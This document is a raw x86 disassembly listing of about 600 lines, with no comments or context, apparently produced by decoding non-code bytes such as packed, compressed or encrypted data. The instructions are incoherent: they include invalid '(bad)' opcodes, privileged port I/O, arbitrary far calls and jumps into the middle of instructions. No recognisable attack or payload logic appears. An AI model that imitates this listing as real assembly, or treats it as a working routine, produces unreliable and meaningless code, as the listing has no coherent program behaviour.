  41211c:	mov    eax,ds:0x36d28d97
  412121:	lock cmp ebp,DWORD PTR [esi-0x2d]
  412125:	push   ds
  412126:	pop    edx
  412127:	add    edi,DWORD PTR [eax]
  412129:	mov    ah,0x10
  41212b:	cmp    BYTE PTR [edx],bl
  41212d:	rcl    BYTE PTR [esi],cl
  41212f:	shr    BYTE PTR [edx],1
  412131:	mov    esi,0x2156d6d2
  412136:	xchg   edi,eax
  412137:	stos   DWORD PTR es:[edi],eax
  412138:	test   dl,bl
  41213a:	lea    edx,[eax]
  41213c:	push   ds
  41213d:	mov    dl,al
  41213f:	xchg   dh,dh
  412141:	mov    DWORD PTR [esi],ebx
  412143:	jle    0x412191
  412145:	jns    0x412162
  412147:	ror    BYTE PTR [edi-0x44],1
  41214a:	faddp  st(5),st
  41214c:	inc    edi
  41214d:	jge    0x4121c9
  41214f:	mov    edx,0x58ec6c3f
  412154:	xor    bh,BYTE PTR [eax+eax*8]
  412157:	jg     0x4121af
  412159:	mov    al,0x54
  41215b:	dec    esp
  41215c:	and    eax,0xd08aec5b
  412161:	cmp    esp,DWORD PTR [esi-0x7e]
  412164:	in     al,0xdf
  412166:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412167:	xchg   BYTE PTR [ebx+0x26dd2f0b],ah
  41216d:	xchg   edx,eax
  41216e:	sub    ch,ah
  412170:	retf   0x2515
  412173:	loope  0x4121e8
  412175:	and    DWORD PTR [eax],esp
  412177:	retf   0x427
  41217a:	inc    eax
  41217b:	aaa    
  41217c:	lea    ebx,[ebx]
  41217e:	xchg   edx,eax
  41217f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412180:	xchg   ebp,eax
  412181:	enter  0xe539,0x57
  412185:	inc    esp
  412186:	sbb    bl,0xfa
  412189:	push   0x18
  41218b:	xor    BYTE PTR [ebp+0x2e],dl
  41218e:	mov    ebx,0xaeb5e285
  412193:	mov    cl,BYTE PTR [ecx-0x1d]
  412196:	sti    
  412197:	adc    BYTE PTR [edi+0x6ffe35b4],dh
  41219d:	xchg   ecx,eax
  41219e:	int3   
  41219f:	lods   eax,DWORD PTR ds:[esi]
  4121a0:	std    
  4121a1:	shl    DWORD PTR [ebx+0x2c],cl
  4121a4:	xor    BYTE PTR [ebx+ebx*2+0x46],bh
  4121a8:	enter  0x83d2,0xd2
  4121ac:	push   eax
  4121ad:	and    esi,esi
  4121af:	popf   
  4121b0:	shl    ebp,0xc9
  4121b3:	adc    eax,0x8b89f78a
  4121b8:	iret   
  4121b9:	out    0x2e,al
  4121bb:	(bad)  
  4121bc:	scas   al,BYTE PTR es:[edi]
  4121bd:	sub    ch,ch
  4121bf:	jp     0x41221e
  4121c1:	das    
  4121c2:	sub    bh,BYTE PTR [esi+0x33]
  4121c5:	mul    BYTE PTR [ecx-0x44511977]
  4121cb:	xlat   BYTE PTR ds:[ebx]
  4121cc:	or     bh,al
  4121ce:	int3   
  4121cf:	mov    eax,ds:0xd5aad893
  4121d4:	call   0x8f72:0x2b6cd225
  4121db:	scas   al,BYTE PTR es:[edi]
  4121dc:	or     eax,0xbc45c7cf
  4121e1:	rcr    BYTE PTR [ebp+0x40c13228],cl
  4121e7:	fcomip st,st(1)
  4121e9:	push   0xf7445fde
  4121ee:	jbe    0x4121cf
  4121f0:	add    ch,BYTE PTR [eax+ebp*4+0x3f5531d6]
  4121f7:	(bad)  
  4121f8:	pop    edx
  4121f9:	fwait
  4121fa:	jne    0x41224b
  4121fc:	mov    WORD PTR [edi-0x21b574d9],es
  412202:	retf   
  412203:	xchg   dh,cl
  412205:	mov    ?,WORD PTR [ebp+esi*8-0x16501880]
  41220c:	jne    0x412275
  41220e:	xor    BYTE PTR [ebx],0x84
  412211:	loope  0x41225a
  412213:	and    edx,0xfe42235f
  412219:	outs   dx,BYTE PTR ds:[esi]
  41221a:	(bad)  
  41221b:	scas   al,BYTE PTR es:[edi]
  41221c:	inc    edi
  41221d:	arpl   WORD PTR [ebx+0x1c91db20],si
  412223:	xor    ebp,DWORD PTR ds:0x3bd4d6fe
  412229:	add    al,BYTE PTR [ebp+ebp*4-0x3b6cbdcc]
  412230:	pop    ds
  412231:	pusha  
  412232:	push   ss
  412233:	sub    BYTE PTR [ebx],cl
  412235:	enter  0xcc1e,0xcf
  412239:	ins    DWORD PTR es:[edi],dx
  41223a:	cmp    BYTE PTR [edx-0x2e],ah
  41223d:	cs loopne 0x41224f
  412240:	fadd   DWORD PTR [ecx-0x4a]
  412243:	push   esi
  412244:	lds    ebp,FWORD PTR [edi-0x64576436]
  41224a:	mov    edi,0x5aa1ad78
  41224f:	sbb    eax,0xfda20cf2
  412254:	inc    ebp
  412255:	in     eax,0x15
  412257:	out    0x83,al
  412259:	imul   eax,esp,0x32542a76
  41225f:	xchg   BYTE PTR [eax-0x47],bh
  412262:	sbb    al,BYTE PTR [ecx-0x5b0d9bc5]
  412268:	div    bl
  41226a:	ins    DWORD PTR es:[edi],dx
  41226b:	adc    DWORD PTR [ecx-0x4c],0xffffff97
  41226f:	mul    BYTE PTR [edi]
  412271:	int3   
  412272:	sub    esp,DWORD PTR [ebp-0x453bf4ee]
  412278:	test   eax,0x69f3deab
  41227d:	mov    bl,0xa2
  41227f:	sbb    ebp,DWORD PTR [edi-0x9]
  412282:	push   0x44
  412284:	arpl   cx,di
  412286:	add    esp,DWORD PTR [ebx]
  412288:	cld    
  412289:	(bad)  
  41228a:	fstp   QWORD PTR [edx]
  41228c:	inc    eax
  41228d:	cwde   
  41228e:	test   al,0xdd
  412290:	rcr    esi,1
  412292:	adc    edi,ebp
  412294:	int    0x2a
  412296:	test   BYTE PTR [ebx],ah
  412298:	(bad)  
  41229a:	or     eax,DWORD PTR [ebp-0x7b]
  41229d:	repz (bad) 
  41229f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122a0:	lods   al,BYTE PTR ds:[esi]
  4122a1:	aam    0xcd
  4122a3:	ror    BYTE PTR [ebx+edx*4],cl
  4122a6:	data16 mov dl,0x50
  4122a9:	cwde   
  4122aa:	push   eax
  4122ab:	retf   0xa1b2
  4122ae:	rcr    BYTE PTR [ebp-0x3df8be0d],1
  4122b4:	xchg   ecx,eax
  4122b5:	daa    
  4122b6:	pop    eax
  4122b7:	jne    0x4122a8
  4122b9:	addr16 sub eax,0x300fc875
  4122bf:	or     esi,DWORD PTR [edx-0x63]
  4122c2:	or     al,0xa9
  4122c4:	pusha  
  4122c5:	pop    eax
  4122c6:	(bad)  
  4122c7:	cli    
  4122c8:	add    DWORD PTR [ebx+0x52e8ab73],esi
  4122ce:	sub    DWORD PTR [eax+0x1dc6a712],edx
  4122d4:	mov    ebx,0xfcf88587
  4122d9:	iret   
  4122da:	ror    DWORD PTR [ebp+0x6b],0xe9
  4122de:	out    0xde,al
  4122e0:	stos   BYTE PTR es:[edi],al
  4122e1:	sub    dl,BYTE PTR [ecx-0x3ae37615]
  4122e7:	jmp    0xbd0d60c4
  4122ec:	cmp    eax,DWORD PTR [esi]
  4122ee:	mov    BYTE PTR [esi-0x41b391ce],ch
  4122f4:	inc    ebx
  4122f5:	mov    ch,0x99
  4122f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122f9:	mov    ds:0x3c2dcc57,eax
  4122fe:	ret    0xeefb
  412301:	sti    
  412302:	xor    ah,BYTE PTR [edx+0x11e2aaa3]
  412308:	fdiv   st,st(2)
  41230a:	int    0xdf
  41230c:	push   edi
  41230d:	stos   DWORD PTR es:[edi],eax
  41230e:	mov    al,ds:0x3a21ffc4
  412313:	in     eax,dx
  412314:	add    DWORD PTR [ebx],edi
  412316:	sar    DWORD PTR [ebx-0x9],cl
  412319:	jmp    0xec86:0x409c993d
  412320:	inc    ebx
  412321:	xor    bl,dl
  412323:	cwde   
  412324:	fbld   TBYTE PTR [ebx+0x1e]
  412327:	inc    edi
  412328:	push   esp
  412329:	adc    al,0xa3
  41232b:	in     eax,0x3e
  41232d:	or     BYTE PTR [edx+ebp*8-0x32064bd7],ah
  412334:	adc    ah,BYTE PTR [ebx+0x22]
  412337:	call   0x38de:0x11507d9b
  41233e:	mov    cl,0xe6
  412340:	pushf  
  412341:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412342:	and    eax,0x778b35e6
  412347:	xor    DWORD PTR [edx],esp
  412349:	fild   WORD PTR [edx]
  41234b:	in     eax,0xdd
  41234d:	or     ch,BYTE PTR [ebx+0x438d60bd]
  412353:	(bad)  
  412354:	mov    al,ds:0xa05a505e
  412359:	jo     0x4123d2
  41235b:	dec    esi
  41235c:	and    eax,0x6f2b9037
  412361:	out    dx,eax
  412362:	inc    ecx
  412363:	fdiv   st,st(5)
  412365:	jb     0x412330
  412367:	inc    esi
  412368:	aaa    
  412369:	pop    edx
  41236a:	xor    BYTE PTR [edi-0x67434c01],bh
  412370:	arpl   bp,ax
  412372:	popa   
  412373:	aas    
  412374:	leave  
  412375:	loop   0x4123cd
  412377:	fisubr DWORD PTR [edi-0x4d18641f]
  41237d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41237e:	xor    DWORD PTR [edx],edi
  412380:	outs   dx,DWORD PTR ds:[esi]
  412381:	popf   
  412382:	jae    0x4123e9
  412384:	dec    edi
  412385:	cmp    DWORD PTR [esi],0xa4dac817
  41238b:	stos   BYTE PTR es:[edi],al
  41238c:	ficom  WORD PTR [esi+0x5a]
  41238f:	lods   eax,DWORD PTR ds:[esi]
  412390:	lods   eax,DWORD PTR ds:[esi]
  412391:	shl    DWORD PTR [eax-0x60],cl
  412394:	imul   esp,eax,0x1b193472
  41239a:	or     bl,dh
  41239c:	jp     0x4123e6
  41239e:	pushf  
  41239f:	icebp  
  4123a0:	scas   eax,DWORD PTR es:[edi]
  4123a1:	xchg   ecx,eax
  4123a2:	ds je  0x4123dd
  4123a5:	sbb    esp,eax
  4123a7:	pop    ebp
  4123a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123a9:	aam    0xae
  4123ab:	sbb    bl,BYTE PTR [edx+eax*8+0x6c]
  4123af:	push   ebp
  4123b0:	sti    
  4123b1:	scas   eax,DWORD PTR es:[edi]
  4123b2:	aas    
  4123b3:	fmul   DWORD PTR [esi]
  4123b5:	pop    ecx
  4123b6:	pop    ss
  4123b7:	jno    0x412343
  4123b9:	div    BYTE PTR [ebp-0xb]
  4123bc:	add    al,0x30
  4123be:	retf   0xa5d4
  4123c1:	(bad)  
  4123c2:	int    0xcb
  4123c4:	or     eax,edi
  4123c6:	vpcomd xmm9,xmm2,xmm0,0x79
  4123cc:	hlt    
  4123cd:	inc    edi
  4123ce:	ds in  al,dx
  4123d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123d1:	(bad)  ds:0xf3323f72
  4123d7:	cmp    al,0x3f
  4123d9:	inc    esi
  4123da:	push   edi
  4123db:	ret    
  4123dc:	call   0x2bf:0x29a2fe45
  4123e3:	dec    edx
  4123e4:	into   
  4123e5:	mov    edi,0x247e8acc
  4123ea:	fimul  WORD PTR [eax+ebx*2+0x4a0b14d6]
  4123f1:	mov    al,ds:0xfb2cc1f5
  4123f6:	out    0xf3,eax
  4123f8:	push   ebp
  4123f9:	cli    
  4123fa:	adc    ecx,ebx
  4123fc:	inc    ebp
  4123fd:	and    DWORD PTR [edx-0x4312168b],edx
  412403:	cmp    DWORD PTR [esi-0x38ed8dd9],edx
  412409:	lods   eax,DWORD PTR ds:[esi]
  41240a:	mov    edx,0xe102cbe3
  41240f:	dec    eax
  412410:	icebp  
  412411:	stos   BYTE PTR es:[edi],al
  412412:	sbb    DWORD PTR [eax],ebx
  412414:	js     0x41245a
  412416:	jmp    0xb19b562d
  41241b:	imul   BYTE PTR [ebx]
  41241d:	xchg   DWORD PTR [ecx],eax
  41241f:	mov    esp,0x27579a11
  412424:	out    0xf1,eax
  412426:	push   ss
  412427:	in     al,0x32
  412429:	cwde   
  41242a:	adc    dh,BYTE PTR [ecx-0x6a5faafe]
  412430:	jle    0x412429
  412432:	popf   
  412433:	mov    fs,WORD PTR ds:0xe2e0e00a
  412439:	jns    0x412406
  41243b:	popf   
  41243c:	call   0x9090:0xf00fd3f8
  412443:	enter  0x48bc,0xd4
  412447:	(bad)  
  412448:	enter  0xfa45,0x2
  41244c:	and    cl,BYTE PTR [ebx]
  41244e:	aas    
  41244f:	mov    ?,esi
  412451:	(bad)  
  412452:	test   eax,0x2401a107
  412457:	push   ds
  412458:	sub    al,0x8c
  41245a:	pop    es
  41245b:	hlt    
  41245c:	mov    ebx,0x796d47c7
  412461:	mov    BYTE PTR [esi],ch
  412463:	mul    BYTE PTR [ecx]
  412465:	cmp    DWORD PTR [edi-0x46],ebx
  412468:	add    BYTE PTR [edi+0x52a8d555],al
  41246e:	mov    edi,0x1ae3ddce
  412473:	xlat   BYTE PTR ss:[ebx]
  412475:	or     DWORD PTR [eax+0x4b9fd847],ebp
  41247b:	ror    DWORD PTR [eax-0x60],0x7
  41247f:	adc    eax,0x426f4248
  412484:	mov    ds:0x3a31cd33,eax
  412489:	inc    esi
  41248a:	icebp  
  41248b:	inc    ebx
  41248c:	fwait
  41248d:	inc    edi
  41248e:	popa   
  41248f:	or     bh,BYTE PTR [edi+0x2f]
  412492:	inc    ecx
  412493:	int    0x1b
  412495:	push   ecx
  412496:	lds    edx,FWORD PTR [edx+0x79]
  412499:	adc    ebp,DWORD PTR [ebx]
  41249b:	add    DWORD PTR [ebx],ebx
  41249d:	adc    DWORD PTR ds:0x9fc5e987,0x7a
  4124a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124a5:	sub    eax,esp
  4124a7:	fadd   QWORD PTR [edx-0x79eb6bf9]
  4124ad:	ret    0x1093
  4124b0:	xlat   BYTE PTR ds:[ebx]
  4124b1:	jmp    0xf11a94ee
  4124b6:	pop    ebx
  4124b7:	jge    0x41245d
  4124b9:	scas   eax,DWORD PTR es:[edi]
  4124ba:	xchg   ecx,eax
  4124bb:	cmp    esp,DWORD PTR [ecx]
  4124bd:	shl    BYTE PTR [edx],0x59
  4124c0:	sub    ah,BYTE PTR [esi+edx*2+0x290c5408]
  4124c7:	inc    esi
  4124c8:	mov    dl,0xae
  4124ca:	push   ecx
  4124cb:	mov    ebp,0x8f341b67
  4124d0:	push   ds
  4124d1:	mov    cl,0x2b
  4124d3:	push   eax
  4124d4:	jb     0x412511
  4124d6:	fcmove st,st(7)
  4124d8:	jbe    0x41249c
  4124da:	cmp    eax,ebx
  4124dc:	sub    dl,BYTE PTR [ecx-0x20]
  4124df:	mov    dl,0x5a
  4124e1:	scas   eax,DWORD PTR es:[edi]
  4124e2:	retf   
  4124e3:	push   0xfffffffb
  4124e5:	cs stos BYTE PTR es:[edi],al
  4124e7:	lods   al,BYTE PTR ds:[esi]
  4124e8:	ficom  DWORD PTR [edx]
  4124ea:	fdiv   st,st(6)
  4124ec:	push   cs
  4124ed:	addr16 adc eax,0x653ecc74
  4124f3:	mov    ah,0x2
  4124f5:	cdq    
  4124f6:	daa    
  4124f7:	rcr    DWORD PTR [eax+0x9f551f2],1
  4124fd:	cmp    esp,DWORD PTR [edx+eiz*1+0x65c16fdb]
  412504:	jnp    0x4124ae
  412506:	and    al,0x80
  412508:	out    dx,al
  412509:	stc    
  41250a:	enter  0x9bcc,0xdb
  41250e:	mov    edi,edi
  412510:	les    ecx,FWORD PTR [edi-0x5ff3ffd]
  412516:	data16 aas 
  412518:	fisttp WORD PTR [edi]
  41251a:	mov    dh,BYTE PTR [eax-0x584efb99]
  412520:	mov    eax,0xc57596fa
  412525:	icebp  
  412526:	jecxz  0x41250b
  412528:	in     eax,0x9e
  41252a:	jge    0x41256d
  41252c:	jbe    0x412500
  41252e:	aam    0xfc
  412530:	adc    al,BYTE PTR [ebx]
  412532:	ins    BYTE PTR es:[edi],dx
  412533:	adc    esp,eax
  412535:	outs   dx,DWORD PTR ds:[esi]
  412536:	jmp    0x8e7:0x67feb9a5
  41253d:	out    0xc9,al
  41253f:	xchg   dl,bl
  412541:	mov    cs,WORD PTR [eax+ebx*1]
  412544:	test   BYTE PTR [ebp-0x7fbffb63],bl
  41254a:	xor    bh,BYTE PTR [ebp*2+0xeee19ea]
  412551:	outs   dx,DWORD PTR ds:[esi]
  412552:	mov    ebx,0xa1ed9485
  412557:	scas   eax,DWORD PTR es:[edi]
  412558:	pop    es
  412559:	test   BYTE PTR [edi+esi*2],ch
  41255c:	mov    ah,BYTE PTR [ecx-0x6c]
  41255f:	mov    ecx,0xe5dd81b4
  412564:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412565:	sti    
  412566:	mov    bl,0x19
  412568:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412569:	ds popa 
  41256b:	dec    ebx
  41256c:	pop    ds
  41256d:	neg    DWORD PTR [eax-0x7d]
  412570:	jbe    0x412528
  412572:	xor    BYTE PTR [eax+edi*8-0x4b74466c],bh
  412579:	pop    esi
  41257a:	mov    WORD PTR [edi-0x4158e530],ss
  412580:	mov    al,BYTE PTR [edi+0x27df2da7]
  412586:	cdq    
  412587:	sbb    ah,bl
  412589:	mov    DWORD PTR [ecx],ecx
  41258b:	mov    eax,ds:0x46d6cc70
  412590:	call   0xb410:0x1169fda5
  412597:	out    dx,al
  412598:	jmp    0x412523
  41259a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41259b:	clc    
  41259c:	sub    bh,bl
  41259e:	push   0x4e9e078b
  4125a3:	ror    BYTE PTR [edi],1
  4125a5:	pop    ss
  4125a6:	sar    DWORD PTR [esi-0x1a18ee8e],cl
  4125ac:	sub    edx,DWORD PTR [esi]
  4125ae:	lea    edi,[edi+0x26e8fb72]
  4125b4:	mov    ch,0x2d
  4125b6:	adc    al,0xa6
  4125b8:	inc    edx
  4125b9:	addr16 push es
  4125bb:	ss ret 
  4125bd:	cmp    ecx,DWORD PTR [eax+0x76]
  4125c0:	dec    eax
  4125c1:	add    BYTE PTR [ecx-0x9],0x3b
  4125c5:	pop    ecx
  4125c6:	fsub   st(2),st
  4125c8:	stc    
  4125c9:	int3   
  4125ca:	jle    0x4125c1
  4125cc:	push   0xb078ffe2
  4125d1:	cs addr16 push eax
  4125d4:	imul   ecx,DWORD PTR [esi],0x9078bf44
  4125da:	cmp    al,BYTE PTR [ebp+0x7746a036]
  4125e0:	enter  0xc9a0,0x33
  4125e4:	dec    esi
  4125e5:	add    eax,0x80a3976f
  4125ea:	or     cl,BYTE PTR [ebp+0x1a]
  4125ed:	cmp    edx,edi
  4125ef:	sbb    bh,dl
  4125f1:	icebp  
  4125f2:	adc    DWORD PTR [bx-0x3ee1],esp
  4125f7:	or     DWORD PTR [eax-0x6c339e1f],0x47b16980
  412601:	pushf  
  412602:	sbb    eax,0x5fd06f09
  412607:	push   ebx
  412608:	fst    DWORD PTR [eax]
  41260a:	jae    0x41265c
  41260c:	sbb    DWORD PTR cs:[ebx-0xc],0xdd3281f3
  412614:	test   ch,ch
  412616:	and    BYTE PTR [edx+ebp*8+0x55],al
  41261a:	ds mov ds,edi
  41261d:	fld    DWORD PTR [eax]
  41261f:	mov    ds:0x7b046ea5,eax
  412624:	(bad)
  412628:	mov    ecx,0xbeee4b01
  41262d:	fldl2t 
  41262f:	stos   DWORD PTR es:[edi],eax
  412630:	inc    ebp
  412631:	or     cl,BYTE PTR [ebx+0x620313e8]
  412637:	pop    es
  412638:	scas   eax,DWORD PTR es:[edi]
  412639:	sub    DWORD PTR [edx],ecx
  41263b:	pop    eax
  41263c:	inc    ecx
  41263d:	imul   edi,DWORD PTR ds:0xa9e881b8,0xffffff9d
  412644:	inc    esi
  412645:	push   esi
  412646:	retf   0xebcb
  412649:	(bad)  
  41264a:	in     al,0xed
  41264c:	add    DWORD PTR [eax-0xe35547d],ebx
  412652:	aaa    
  412653:	mov    eax,ds:0xbd483175
  412658:	loopne 0x41262f
  41265a:	mov    al,0x4c
  41265c:	jns    0x412602
  41265e:	inc    eax
  41265f:	ins    BYTE PTR es:[edi],dx
  412660:	scas   al,BYTE PTR es:[edi]
  412661:	pushf  
  412662:	scas   al,BYTE PTR es:[edi]
  412663:	inc    edx
  412664:	mov    ch,0x63
  412666:	sbb    esi,edx
  412668:	inc    eax
  412669:	call   0xb6d56ed5
  41266e:	out    dx,al
  41266f:	cli    
  412670:	(bad)  [eax+0x73]
  412673:	in     eax,0xa8
  412675:	add    esp,DWORD PTR [esi]
  412677:	ins    BYTE PTR es:[edi],dx
  412678:	jl     0x412687
  41267a:	jle    0x412603
  41267c:	or     bl,cl
  41267e:	fdivr  QWORD PTR [ebp-0x41]
  412681:	dec    edi
  412682:	jo     0x412683
  412684:	int3   
  412685:	add    edi,DWORD PTR [ecx-0x5f]
  412688:	jb     0x4126c8
  41268a:	adc    BYTE PTR [ebx],0xb0
  41268d:	xor    DWORD PTR [eax-0x1c],edi
  412690:	lea    ebx,[eax-0x55c59d6b]
  412696:	scas   eax,DWORD PTR es:[edi]
  412697:	out    0x9,eax
  412699:	fnstsw WORD PTR [eax+0x75]
  41269c:	loope  0x41264f
  41269e:	repz cmc 
  4126a0:	pop    esi
  4126a1:	test   BYTE PTR [ebx+0x1b6717b4],ch
  4126a7:	in     eax,0xe6
  4126a9:	dec    esp
  4126aa:	dec    edi
  4126ab:	adc    dl,dh
  4126ad:	mov    bl,0xd3
  4126af:	das    
  4126b0:	test   BYTE PTR [esi-0x6c],cl
  4126b3:	mov    ah,0xe
  4126b5:	xchg   dh,al
  4126b7:	gs mov ebx,0x2b83fb32
  4126bd:	mov    bl,0x1d
  4126bf:	inc    esi
  4126c0:	mov    fs,WORD PTR [ecx]
  4126c2:	repnz inc ebx
  4126c4:	and    BYTE PTR [edi-0x1880f030],bl
  4126ca:	outs   dx,DWORD PTR ds:[esi]
  4126cb:	jecxz  0x41273e
  4126cd:	lods   al,BYTE PTR ds:[esi]
  4126ce:	sub    eax,DWORD PTR [esi]
  4126d0:	(bad)  
  4126d1:	js     0x4126f3
  4126d3:	leave  
  4126d4:	rcl    BYTE PTR [edx-0x32],0x6c
  4126d8:	fdiv   DWORD PTR [edx-0x27]
  4126db:	arpl   WORD PTR [eax],di
  4126dd:	mov    ds:0xa7eebec3,al
  4126e2:	sub    ebp,esi
  4126e4:	or     ah,cl
  4126e6:	pop    esp
  4126e7:	shl    BYTE PTR [eax+0x5d],0xf6
  4126eb:	lock push 0x3b
  4126ee:	dec    ecx
  4126ef:	ja     0x412682
  4126f1:	dec    esp
  4126f2:	xor    esp,DWORD PTR [ebp-0x539a6fff]
  4126f8:	jbe    0x4126bb
  4126fa:	push   eax
  4126fb:	cmc    
  4126fc:	jmp    0x4126b3
  4126fe:	cld    
  4126ff:	sub    al,0xa5
  412701:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412702:	jae    0x41271d
  412704:	pop    ds
  412705:	xchg   ecx,eax
  412706:	ins    DWORD PTR es:[edi],dx
  412707:	mov    ds:0x3a9b6b86,al
  41270c:	sub    BYTE PTR [ebx+0x4193f8d1],ah
  412712:	add    ecx,DWORD PTR [esi]
  412714:	out    dx,al
  412715:	or     DWORD PTR [ecx+esi*2],ebx
  412718:	sub    DWORD PTR [ecx-0xaf752d8],0x32d2d9d0
  412722:	xlat   BYTE PTR ds:[ebx]
  412723:	mov    cl,0xed
  412725:	scas   al,BYTE PTR es:[edi]
  412726:	sub    edi,DWORD PTR [esi+eiz*8-0x48b8fc92]
  41272d:	ds ss out 0x7e,eax
  412731:	ins    DWORD PTR es:[edi],dx
  412732:	(bad)  
  412733:	jno    0x412730
  412735:	xchg   ecx,edi
  412737:	loopne 0x412776
  412739:	jg     0x41279d
  41273b:	mov    ch,0x1f
  41273d:	sti    
  41273e:	les    ebp,FWORD PTR ds:0xabc894b2
  412744:	sub    ebp,esi
  412746:	(bad)  [ecx+esi*2-0x66]
  41274a:	mov    WORD PTR ds:0x6c4f75f3,fs
  412750:	mov    dl,0xfd
  412752:	pop    esi
  412753:	sti    
  412754:	retf   
  412755:	imul   edx,DWORD PTR [ebx-0x1c],0x107b1dbe
  41275c:	imul   edi,ebx,0xfffffffa
  41275f:	out    dx,eax
  412760:	lahf   
  412761:	fmulp  st(4),st
  412763:	xchg   esi,eax
  412764:	xchg   esi,eax
  412765:	cmc    
  412766:	sti    
  412767:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412768:	push   0x5d
  41276a:	js     0x41272d
  41276c:	fldenv [ecx]
  41276e:	hlt    
  41276f:	sub    dl,0x54
  412772:	or     DWORD PTR [edx+0x19a0fc22],ebp
  412778:	(bad)  
  412779:	pop    eax
  41277a:	iret   
  41277b:	ret    0x332c
  41277e:	sub    ch,BYTE PTR [ebx-0x2fb48698]
  412784:	xchg   ebx,eax
  412785:	fcom   DWORD PTR [edx]
  412787:	xchg   ebx,eax
  412788:	daa    
  412789:	loopne 0x412779
  41278b:	int    0x9d
  41278d:	in     eax,0x75
  41278f:	aas    
  412790:	dec    esi
  412791:	loopne 0x4127c5
  412793:	test   DWORD PTR [ebp+0x5c],esi
  412796:	cmp    DWORD PTR [eax],esp
  412798:	dec    esp
  412799:	cli    
  41279a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41279b:	loope  0x4127bf
  41279d:	repnz mov eax,ds:0xe64991e3
  4127a3:	jns    0x412791
  4127a5:	cmp    eax,0x9ee00bd5
  4127aa:	xor    BYTE PTR [eax+0x74cd26eb],ah
  4127b0:	in     eax,dx
  4127b1:	dec    esi
  4127b2:	sub    eax,0x29d87b26
  4127b7:	mov    ds,esi
  4127b9:	in     eax,dx
  4127ba:	daa    
  4127bb:	cld    
  4127bc:	out    0x6f,al
  4127be:	aaa    
  4127bf:	cmp    al,cl
  4127c1:	inc    edi
  4127c2:	ds jecxz 0x4127ec
  4127c5:	pop    ebx
  4127c6:	push   0xfef2678c
  4127cb:	adc    eax,0xc762e064
  4127d0:	arpl   WORD PTR [edx+0x49ddebf8],sp
  4127d6:	or     edx,esi
  4127d8:	ss aam 0xb
  4127db:	lds    ecx,FWORD PTR [edi-0x70a88d15]
  4127e1:	lahf   
  4127e2:	cmp    eax,0x9143dd31
  4127e7:	ins    DWORD PTR es:[edi],dx
  4127e8:	dec    edx
  4127e9:	sbb    al,0x2
  4127eb:	inc    ecx
  4127ec:	xchg   edi,eax
  4127ed:	scas   al,BYTE PTR es:[edi]
  4127ee:	jo     0x41282f
  4127f0:	sub    eax,0x4d93941c
  4127f5:	mov    al,0xa7
  4127f7:	fisttp WORD PTR [ebp+0x5b]
  4127fa:	cli    
  4127fb:	in     eax,dx
  4127fc:	stos   DWORD PTR es:[edi],eax
  4127fd:	xor    al,bh
  4127ff:	sar    DWORD PTR [esp+eax*4+0xc46999],0x68
  412807:	loop   0x4127c1
  412809:	icebp  
  41280a:	shr    edi,cl
  41280c:	sub    ah,BYTE PTR [edi]
  41280e:	sub    ch,BYTE PTR [edi]
  412810:	mov    ds:0x13e6addc,eax
  412815:	mov    ebp,0xe7e307b4
  41281a:	paddw  mm1,mm0
  41281d:	sysenter 
  41281f:	push   ss
  412820:	jmp    0xf9b5b2f8
  412825:	popf   
  412826:	sbb    eax,0x2c08d4d5
  41282b:	outs   dx,BYTE PTR ds:[esi]
  41282c:	mov    ds:0xb5e74033,al
  412831:	lahf   
  412832:	(bad)  
  412834:	std    
  412835:	rcr    al,1
  412837:	inc    esi
  412838:	dec    ebp
  412839:	xchg   edi,eax
  41283a:	ins    DWORD PTR es:[edi],dx
  41283b:	mov    bl,0x1b
  41283d:	ja     0x41281c
  41283f:	ds add eax,0xcbb22b44
  412845:	std    
  412846:	rcl    DWORD PTR [ebx+edi*4-0x618ab42e],cl
  41284d:	push   ebx
  41284e:	mov    ax,ds:0xc464937c
  412854:	or     dl,BYTE PTR [eax+0x5e8f5e3d]
  41285a:	pop    edx
  41285b:	xchg   ecx,eax
  41285c:	icebp  
  41285d:	sbb    edx,esi
  41285f:	ds stc 
  412861:	ins    DWORD PTR es:[edi],dx
  412862:	push   eax
  412863:	mov    bl,0xdb
  412865:	mov    bl,dl
  412867:	leave  
  412868:	repz mov edx,0xa9f0ca9e
  41286e:	jecxz  0x412877
  412870:	ja     0x41288a
  412872:	sbb    al,0x19
  412874:	(bad)  
  412875:	cmovns edx,DWORD PTR [eax+ebp*2+0x74]
  41287a:	das    
  41287b:	repnz dec ebx
  41287d:	cmp    eax,DWORD PTR [ecx+0x57]
  412880:	cwde   
  412881:	sbb    eax,DWORD PTR [ebx]
  412883:	mov    edi,0x10632ad1
  412888:	jmp    0xd121e271
  41288d:	adc    BYTE PTR [edx],al
  41288f:	aad    0xf0
  412891:	test   al,ah
  412893:	sub    al,0x2b
  412895:	scas   al,BYTE PTR es:[edi]
  412896:	inc    ebp
  412897:	mov    ebp,0xadbf7b11
  41289c:	rcr    BYTE PTR [eax+0x4b],cl
  41289f:	dec    ebp
  4128a0:	fcmovne st,st(7)
  4128a2:	xchg   esi,eax
  4128a3:	in     eax,dx
  4128a4:	pop    ecx
  4128a5:	add    BYTE PTR [edi-0x7a],0xec
  4128a9:	stos   DWORD PTR es:[edi],eax
  4128aa:	mov    edx,0xc50a4738
  4128af:	(bad)  
  4128b0:	pop    ecx
  4128b1:	rol    BYTE PTR [ecx-0x5b],1
  4128b4:	test   ch,ch
  4128b6:	int    0x7d
  4128b8:	retf   0x47d0
  4128bb:	pop    ebp
  4128bc:	add    eax,0x988c981f
  4128c1:	inc    edx
  4128c2:	dec    ecx
  4128c3:	adc    BYTE PTR [ecx+eiz*1],dh
  4128c6:	retf   0x587b
  4128c9:	std    
